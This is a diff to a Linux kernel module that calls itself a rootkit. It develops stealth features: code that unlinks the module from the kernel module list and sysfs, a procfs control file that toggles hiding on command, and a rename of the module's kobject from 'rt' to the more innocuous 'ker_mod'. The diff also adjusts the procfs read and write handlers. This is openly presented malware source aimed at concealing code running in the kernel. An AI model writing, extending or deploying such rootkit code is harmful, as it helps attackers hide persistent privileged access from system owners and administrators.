@@ -53,6 +53,9 @@ static char module_hidden = 0;
 static struct list_head *module_previous;
 static struct list_head *module_kobj_previous;
 
+static int temp;
+static char desc[50];
+
 void module_hide(void) {
 		if(module_hidden) return;
 		module_previous = THIS_MODULE->list.prev;
@@ -68,12 +71,23 @@ void module_show(void) {
 		int result;
 		if(!module_hidden) return;
 		list_add(&THIS_MODULE->list, module_previous);
-		result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "rt");
+		result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "ker_mod");
 		module_hidden = !module_hidden;
 		printk(KERN_INFO "Rootkit no longer hidden\n");
 }
 
 static ssize_t rtkit_read(struct file *file, char __user *buffer, size_t count, loff_t *ppos) {
+		if(count > temp)
+				count = temp;
+		temp -= count;
+
+		copy_to_user(buffer, desc, count);
+
+		if(count == 0) {
+				sprintf(desc, "test\n");
+				temp = strlen(desc);
+		}
+
 		return count;
 }
 
@@ -83,7 +97,7 @@ static ssize_t rtkit_write(struct file *file, const char __user *buffer, size_t 
 		} else if(!strncmp(buffer, SHOW_MOD_CMD, strlen(SHOW_MOD_CMD))) {
 				module_show();
 		}
-		return 0;
+		return count;
 }
 
 static const struct file_operations rootkit_fops = { 
@@ -101,6 +115,9 @@ static int procfs_init(void) {
 		if(proc_root == NULL || strcmp(proc_root->name, "/proc") != 0)
 				return 0;
 
+		sprintf(desc, "test\n");
+		temp = strlen(desc);
+
 		return 1;
 }
 
@@ -112,9 +129,6 @@ static void procfs_clean(void) {
 }
 
 static int __init rootkit_init(void) {
-		/* Hiding module. Commented because I can't stop it with rmmod */
-	//	list_del_init(&__this_module.list);
-	//	kobject_del(&THIS_MODULE->mkobj.kobj);
 		if(!procfs_init()) {
 				procfs_clean();
 				return 1;
